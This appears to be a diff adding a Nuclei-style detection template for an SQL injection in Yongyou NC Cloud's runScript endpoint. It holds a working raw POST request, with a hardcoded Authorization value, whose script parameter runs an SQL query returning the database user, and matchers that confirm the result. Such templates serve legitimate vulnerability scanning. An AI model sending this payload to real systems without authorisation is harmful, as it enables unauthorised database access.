@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-nc-cloud-runscript-sqli
+info:
+  name: Yongyou NC Cloud runScript SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Yongyou NC Cloud
+variables:
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{to_number(t1)*to_number(t1)}}"
+http:
+  - raw:
+      - |
+        POST /ncchr/attendScript/internal/runScript HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Authorization: 58e00466213416018d01d15de83b0198
+
+        key=1&script=select 1,{{t1}}*{{t1}},USER,4,5,6,7,8,9,10 from dual
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"USER\""
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
